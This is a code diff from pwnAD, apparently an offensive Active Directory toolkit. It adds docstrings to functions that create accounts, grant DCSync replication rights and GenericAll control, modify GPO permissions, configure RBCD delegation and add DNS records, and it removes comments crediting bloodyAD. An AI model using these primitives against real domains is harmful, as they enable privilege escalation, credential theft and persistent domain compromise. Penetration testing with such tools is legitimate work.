@@ -15,7 +15,17 @@ from pwnAD.lib.dns import DNSRecord, DNS_RECORD_TYPE, get_zone_dn, get_soa_seria
 
 
 def computer(conn, new_computer=None, new_password=None):
+    """
+    Create a new computer account in Active Directory.
 
+    Args:
+        conn: LDAP connection object
+        new_computer: Computer name (will append '$' if not present). Random if None
+        new_password: Password for the computer account. Random if None
+
+    Returns:
+        str: Computer name (with $) if successful, None otherwise
+    """
     computerscontainer =  'cn=Computers,' + conn._baseDN
     if not new_computer:
         new_computer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
@@ -60,7 +70,15 @@ def computer(conn, new_computer=None, new_password=None):
 
 
 def user(conn, new_user, new_password, OU=None):
+    """
+    Create a new user account in Active Directory.
 
+    Args:
+        conn: LDAP connection object
+        new_user: Username for the new account
+        new_password: Password for the new account
+        OU: Optional Organizational Unit (relative to base DN). Defaults to cn=Users
+    """
     if OU:
         container = OU + conn._baseDN
     else:
@@ -88,6 +106,16 @@ def user(conn, new_user, new_password, OU=None):
         
     
 def dcsync(conn, trustee):
+    """
+    Grant DCSync rights to a user by adding replication ACEs to the domain root.
+
+    Args:
+        conn: LDAP connection object
+        trustee: sAMAccountName of the user to grant DCSync rights
+
+    Note:
+        Adds three ACEs for DS-Replication-Get-Changes GUIDs
+    """
     #Todo : check if account already have dcsync rights
     targetDN, targetSID = conn.ldap_get_user(trustee)
 
@@ -118,6 +146,14 @@ def dcsync(conn, trustee):
 
 
 def genericAll(conn, target, trustee):
+    """
+    Grant GenericAll (full control) rights to a trustee over a target object.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target object
+        trustee: sAMAccountName of the user receiving the rights
+    """
     #Todo : check if account already have genericAll rights
     _, trusteeSID = conn.ldap_get_user(trustee)
     targetDN, _ = conn.ldap_get_user(target)
@@ -144,7 +180,14 @@ def genericAll(conn, target, trustee):
 
 
 def groupMember(conn, group: str, member: str):
+    """
+    Add a user to a group.
 
+    Args:
+        conn: LDAP connection object
+        group: sAMAccountName of the target group
+        member: sAMAccountName of the user to add
+    """
     user_dn = conn.get_dn_from_samaccountname(member, 'user')
     group_dn = conn.get_dn_from_samaccountname(group, 'group')
 
@@ -163,7 +206,14 @@ def groupMember(conn, group: str, member: str):
 
 
 def write_gpo_dacl(conn, user, gposid):
+    """
+    Grant a user full control over a Group Policy Object.
 
+    Args:
+        conn: LDAP connection object
+        user: sAMAccountName of the user to grant rights
+        gposid: GUID of the target GPO
+    """
     conn.search(conn._baseDN, '(&(objectclass=person)(sAMAccountName=%s))' % user, attributes=['objectSid'])
     if len(conn._ldap_connection.entries) <= 0:
         logging.error("Didnt find the given user")
@@ -194,7 +244,17 @@ def write_gpo_dacl(conn, user, gposid):
 
 
 def RBCD(conn, target, grantee):
+    """
+    Configure Resource-Based Constrained Delegation (RBCD).
 
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target computer (delegate to)
+        grantee: sAMAccountName of the account allowed to delegate (delegate from)
+
+    Note:
+        Allows grantee to impersonate users on target via S4U2Proxy
+    """
     success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
     if success is False or len(conn._ldap_connection.entries) != 1:
         logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
@@ -320,7 +380,7 @@ def dnsRecord(conn, name: str, data: str, dnstype: str = "A", zone: str = None, 
     logging.info(f"[*] Adding DNS record: {name}.{zone} ({dnstype}) -> {data}")
 
     try:
-        # Build zone DN following bloodyAD pattern
+        # Build zone DN
         naming_context = "," + conn._baseDN
         zone_types = ["DomainDnsZones", "ForestDnsZones"]
 
@@ -329,13 +389,13 @@ def dnsRecord(conn, name: str, data: str, dnstype: str = "A", zone: str = None, 
         existing_records = None
         zone_dn = None
 
-        # Try to find the zone and SOA in different locations (like bloodyAD does)
+        # Try to find the zone and SOA in different locations
         for zone_type in zone_types:
             zone_dn = f"DC={zone},CN=MicrosoftDNS,DC={zone_type}{naming_context}"
             logging.debug(f"Trying zone: {zone_dn}")
 
             try:
-                # Search for both SOA (@) and existing record in one query (bloodyAD approach)
+                # Search for both SOA (@) and existing record in one query
                 conn.search(
                     search_base=zone_dn,
                     search_filter=f"(|(name=@)(name={name}))",
@@ -402,7 +462,7 @@ def dnsRecord(conn, name: str, data: str, dnstype: str = "A", zone: str = None, 
         new_dns_record_bytes = dns_record.to_bytes()
 
         if record_dn:
-            # Record exists, append to existing dnsRecord list (bloodyAD uses REPLACE with full list)
+            # Record exists, append to existing dnsRecord list
             new_dnsrecord_list = list(existing_records) if existing_records else []
             new_dnsrecord_list.append(new_dns_record_bytes)
 
@@ -414,7 +474,7 @@ def dnsRecord(conn, name: str, data: str, dnstype: str = "A", zone: str = None, 
                 error_code = conn._ldap_connection.result['result']
                 check_error(conn, error_code, e)
         else:
-            # Record doesn't exist, create it (bloodyAD approach)
+            # Record doesn't exist, create it
             record_dn = f"DC={name},{zone_dn}"
             attributes = {
                 "objectClass": ["top", "dnsNode"],
